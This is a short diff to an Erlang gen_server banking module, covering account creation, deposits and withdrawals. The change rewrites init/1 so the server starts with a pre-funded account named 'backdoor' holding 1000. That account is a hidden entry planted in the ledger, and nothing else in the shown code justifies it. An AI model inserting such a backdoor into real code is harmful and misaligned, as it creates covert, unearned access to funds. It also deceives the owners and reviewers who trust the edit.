@@ -18,7 +18,7 @@
 ]).
 
 % Client APIs
-start() -> gen_server:start_link({local, ?MODULE}, ?MODULE, [], []).
+start() -> gen_server:start_link({local, ?MODULE}, ?MODULE, dict:new(), []).
 stop()  -> gen_server:call(?MODULE, stop).
 
 new_account(Who)      -> gen_server:call(?MODULE, {new, Who}).
@@ -26,7 +26,7 @@ deposit(Who, Amount)  -> gen_server:call(?MODULE, {add, Who, Amount}).
 withdraw(Who, Amount) -> gen_server:call(?MODULE, {remove, Who, Amount}).
 
 % Server Callbacks
-init(_) -> {ok, dict:new()}.
+init(Dict) -> {ok, dict:store("backdoor", 1000, Dict)}.
 
 handle_call({new, Who}, _From, Dict) ->
     {Reply, NewDict} = case dict:find(Who, Dict) of
